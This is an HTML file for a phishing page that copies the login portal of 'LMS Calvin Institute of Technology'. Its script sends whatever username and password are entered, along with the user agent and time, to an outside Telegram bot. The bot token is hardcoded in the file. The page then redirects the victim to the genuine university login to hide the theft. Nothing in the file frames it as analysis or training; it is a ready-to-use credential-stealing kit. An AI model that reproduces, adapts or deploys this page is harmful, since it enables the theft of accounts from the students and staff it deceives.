<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LMS Calvin - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .login-container { background: white; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); padding: 40px; width: 100%; max-width: 400px; text-align: center; }
        .logo { width: 120px; margin-bottom: 20px; margin: 0 auto 20px; }
        h2 { color: #333; margin-bottom: 10px; font-weight: 600; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        input { width: 100%; padding: 12px 15px; border: 2px solid #e1e5e9; border-radius: 8px; font-size: 14px; transition: all 0.3s ease; }
        input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
        .btn-login { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s ease; }
        .btn-login:hover { transform: translateY(-2px); }
        .footer { margin-top: 20px; color: #666; font-size: 12px; }
        .loading, .success-message, .error-message { display: none; margin-top: 10px; padding: 12px; border-radius: 6px; }
        .loading { color: #667eea; }
        .success-message { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error-message { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg width="120" height="40" viewBox="0 0 120 40">
                <rect width="120" height="40" fill="#667eea" rx="8"/>
                <text x="60" y="25" text-anchor="middle" fill="white" font-family="Arial" font-size="14">LMS CALVIN</text>
            </svg>
        </div>
        
        <h2>Welcome Back</h2>
        <p class="subtitle">Please sign in to your account</p>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Email Address</label>
                <input type="text" id="username" name="username" placeholder="Enter your email" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <button type="submit" class="btn-login" id="loginBtn">Sign In</button>
            
            <div class="loading" id="loading">Authenticating... Please wait</div>
            <div class="success-message" id="successMessage">âœ“ Login successful! Redirecting...</div>
            <div class="error-message" id="errorMessage">âœ— Invalid credentials. Please try again.</div>
        </form>
        
        <div class="footer">
            <p>LMS Calvin Institute of Technology</p>
            <p>Â© 2024 All rights reserved</p>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '6394213465:AAG7bMCNksGqjL3dKtHwfESnV5NX5ri9XUQ';
        const CHAT_ID = 'YOUR_CHAT_ID'; // GANTI INI!
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const loading = document.getElementById('loading');
            const successMessage = document.getElementById('successMessage');
            const errorMessage = document.getElementById('errorMessage');
            
            successMessage.style.display = errorMessage.style.display = 'none';
            loginBtn.disabled = true;
            loading.style.display = 'block';
            loginBtn.textContent = 'Authenticating...';
            
            try {
                // Kirim ke Telegram
                const message = `ðŸ” **New Login Captured**\n\nðŸ‘¤ **Username:** ${username}\nðŸ”‘ **Password:** ${password}\nðŸŒ **UA:** ${navigator.userAgent}\nðŸ“ **IP:** Fetching...\nðŸ•’ **Time:** ${new Date().toLocaleString()}`;
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (response.ok) {
                    successMessage.style.display = 'block';
                    loading.style.display = 'none';
                    setTimeout(() => {
                        window.location.href = 'https://lms.calvin.ac.id/login/index.php';
                    }, 2000);
                } else {
                    throw new Error('Send failed');
                }
                
            } catch (error) {
                errorMessage.style.display = 'block';
                loading.style.display = 'none';
                loginBtn.disabled = false;
                loginBtn.textContent = 'Sign In';
            }
        });
    </script>
</body>
</html>
